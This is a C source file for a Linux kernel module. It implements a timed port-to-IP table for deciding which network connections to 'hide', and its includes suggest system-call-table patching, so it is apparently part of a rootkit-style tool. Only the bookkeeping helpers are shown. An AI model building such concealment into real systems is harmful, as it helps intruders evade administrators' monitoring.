#include <linux/module.h>  /* Needed by all kernel modules */
#include <linux/kernel.h>  /* Needed for loglevels (KERN_WARNING, KERN_EMERG, KERN_INFO, etc.) */
#include <linux/init.h>    /* Needed for __init and __exit macros. */
#include <linux/moduleparam.h>
#include <linux/unistd.h>  /* sys_call_table __NR_* system call function indices */
#include <linux/fs.h>      /* filp_open */
#include <linux/slab.h>    /* kmalloc */

#include <asm/paravirt.h> /* write_cr0 */
#include <asm/uaccess.h>  /* get_fs, set_fs */
#include <linux/utsname.h>
#include <asm/cacheflush.h>
#include <linux/semaphore.h>
#include <linux/kallsyms.h>

#include <linux/file.h>
#include <linux/net.h>
#include <net/inet_sock.h>
#include <linux/byteorder/generic.h>
#include <linux/netfilter.h>
#include <linux/vmalloc.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <net/udp.h>
#include <linux/ktime.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/inet.h>
#include <linux/etherdevice.h>
#include <linux/icmp.h>
#include <net/tcp.h>

#include "hide_ip_port_map.h"
#include "monitor_proc.h"

struct ip_node {
    u32 addr;
    unsigned long update;
};

struct hide_ip_port_map {
    struct ip_node map[65536];
    int timeout;
    spinlock_t lock;
};

struct hide_ip_port_map hide_map;

void init_hide_ip_port_map(int timeout)
{
    spin_lock_init(&(hide_map.lock));
    hide_map.timeout = timeout;
    memset(hide_map.map, 0, sizeof(hide_map.map));
    MY_PRINT("hide port ip map size: %lu\n", sizeof(hide_map.map));
}

void update_port_ip(u16 port, u32 ip)
{
    spin_lock_bh(&(hide_map.lock));
    hide_map.map[port].addr = ip;
    hide_map.map[port].update = jiffies;
    spin_unlock_bh(&(hide_map.lock));
}

int is_hide_ipaddr(u16 port, u32 ip)
{
    int ret = 0;
    spin_lock_bh(&(hide_map.lock));    
    //MY_PRINT("11111 port: %d, ip: %x\n", ntohs(port), ip);
    if (hide_map.map[port].addr != ip) {
        ret = 0;
        goto RET;
    }
    if (jiffies - hide_map.map[port].update >= msecs_to_jiffies(hide_map.timeout)) {
        ret = 0;
        goto RET;
    }
    ret = 1;
RET:
    spin_unlock_bh(&(hide_map.lock));
    return ret;
}

